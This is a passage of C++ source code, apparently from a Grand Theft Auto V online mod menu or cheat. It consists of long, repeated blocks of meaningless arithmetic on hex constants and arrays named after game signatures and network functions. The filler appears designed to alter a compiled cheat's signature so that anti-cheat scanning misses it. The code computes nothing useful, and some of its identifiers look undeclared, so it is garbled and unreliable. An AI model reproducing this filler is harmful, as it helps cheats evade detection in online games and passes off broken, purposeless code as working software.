				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::arquivoTXT = XMLPath;

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
